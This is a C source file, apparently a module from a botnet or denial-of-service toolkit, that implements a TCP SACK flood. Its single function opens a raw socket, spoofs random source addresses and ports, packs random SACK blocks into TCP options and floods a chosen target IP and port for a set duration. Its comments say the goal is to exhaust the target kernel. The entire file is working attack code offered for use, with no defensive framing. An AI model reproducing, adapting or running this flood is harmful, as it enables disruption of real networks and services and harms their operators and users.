#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>
#include <time.h>

#include "attack.h"

struct pseudo_header {
    u_int32_t source_address;
    u_int32_t dest_address;
    u_int8_t placeholder;
    u_int8_t protocol;
    u_int16_t tcp_length;
};

// Advanced SACK (Selective ACK) Flood
// Uses SACK Options to force target kernel to perform expensive queue scanning.
// Payload: SACK Option with random block ranges.
void attack_tcp_sack(uint32_t ip, uint16_t port, uint32_t duration) {
    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if (sock < 0) return;

    int one = 1;
    setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));

    struct sockaddr_in sin;
    sin.sin_family = AF_INET;
    sin.sin_port = htons(port);
    sin.sin_addr.s_addr = ip;

    char packet[4096];
    struct ip *iph = (struct ip *)packet;
    struct tcphdr *tcph = (struct tcphdr *)(packet + sizeof(struct ip));
    struct pseudo_header psh;

    time_t end_time = time(NULL) + duration;

    // SACK Option Structure:
    // Kind: 5 (SACK)
    // Length: Variable (e.g., 10, 18, 26, 34)
    // Edges: Left edge (4B), Right edge (4B) ... up to 4 blocks.
    // Total max option space 40 bytes. We can fit 4 blocks (32 bytes) + 2 bytes header = 34 bytes.
    
    // IP Header
    iph->ip_hl = 5;
    iph->ip_v = 4;
    iph->ip_tos = 0;
    iph->ip_len = sizeof(struct ip) + sizeof(struct tcphdr) + 36; // 36 bytes options
    iph->ip_id = htonl(54321);
    iph->ip_off = 0;
    iph->ip_ttl = 255;
    iph->ip_p = IPPROTO_TCP;
    iph->ip_dst.s_addr = ip;

    while (time(NULL) < end_time) {
        iph->ip_src.s_addr = fast_rand();
        iph->ip_id = htonl(fast_rand() & 0xFFFF);
        iph->ip_sum = 0;
        iph->ip_sum = csum((unsigned short *)packet, iph->ip_len);

        tcph->th_sport = htons(fast_rand() & 0xFFFF);
        tcph->th_dport = htons(port);
        tcph->th_seq = fast_rand();
        tcph->th_ack = fast_rand(); // Must differ from seq usually
        tcph->th_off = 14; // 5 + 9 words (36 bytes)
        tcph->th_flags = TH_ACK; // SACK requires ACK
        tcph->th_win = htons(64240);
        tcph->th_sum = 0;
        tcph->th_urp = 0;

        uint8_t *opts = (uint8_t *)(packet + sizeof(struct ip) + sizeof(struct tcphdr));
        
        // NOP NOP to align?
        opts[0] = 1; opts[1] = 1; 

        // SACK Option (Kind 5)
        // Length 34 (2 header + 32 data for 4 blocks)
        opts[2] = 5; opts[3] = 34;

        // Generate 4 random SACK blocks
        // Block 1
        *(uint32_t*)(opts + 4) = htonl(fast_rand()); // Left
        *(uint32_t*)(opts + 8) = htonl(fast_rand()); // Right
        // Block 2
        *(uint32_t*)(opts + 12) = htonl(fast_rand());
        *(uint32_t*)(opts + 16) = htonl(fast_rand());
        // Block 3
        *(uint32_t*)(opts + 20) = htonl(fast_rand());
        *(uint32_t*)(opts + 24) = htonl(fast_rand());
        // Block 4
        *(uint32_t*)(opts + 28) = htonl(fast_rand());
        *(uint32_t*)(opts + 32) = htonl(fast_rand());

        psh.source_address = iph->ip_src.s_addr;
        psh.dest_address = sin.sin_addr.s_addr;
        psh.placeholder = 0;
        psh.protocol = IPPROTO_TCP;
        psh.tcp_length = htons(sizeof(struct tcphdr) + 36);

        // Calculate Checksum (Heavy op, but needed for pass-through)
        // Optimization: For SACK flood, speed matters more than correctness of checksum sometimes, 
        // but bad checksum is dropped by NIC usually. 
        // We use stack buffer optimization again.
        char pseudogram[256]; 
        memcpy(pseudogram, (char*)&psh, sizeof(struct pseudo_header));
        memcpy(pseudogram + sizeof(struct pseudo_header), tcph, sizeof(struct tcphdr) + 36);
        
        tcph->th_sum = csum((unsigned short*)pseudogram, sizeof(struct pseudo_header) + sizeof(struct tcphdr) + 36);

        sendto(sock, packet, iph->ip_len, 0, (struct sockaddr *)&sin, sizeof(sin));
    }
    close(sock);
}
